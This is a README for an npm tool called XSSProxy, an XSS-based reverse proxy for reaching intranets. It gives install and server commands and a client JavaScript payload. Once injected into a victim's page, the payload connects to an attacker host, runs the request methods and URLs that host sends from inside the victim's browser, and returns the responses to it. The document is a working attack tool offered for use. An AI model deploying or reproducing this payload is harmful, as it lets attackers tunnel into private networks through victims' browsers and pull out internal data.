# XSSProxy (Alpha version)

  A XSS based reverse proxy,be used for cross the intranet via XSS.

## Install
`npm install -g xssproxy`

## Usage
Server:
```command
xssproxy
xssproxy -p 8000 -sp 8001
xssproxy --port 8000 --sio-port 8001
```

client:
```javascript
var script = document.createElement('script');
script.onload = function(){
  var socket = io('http://xssproxy:8001');
  socket.on('request', function (data,send) {
      var xhr = new XMLHttpRequest;
      xhr.open(data.method,data.url); 
      xhr.onload=function(){send(this.responseText);};
      xhr.send();
  }); 
};
script.src = 'http://xssproxy:8001/socket.io/socket.io.js';
document.head.appendChild(script);
```
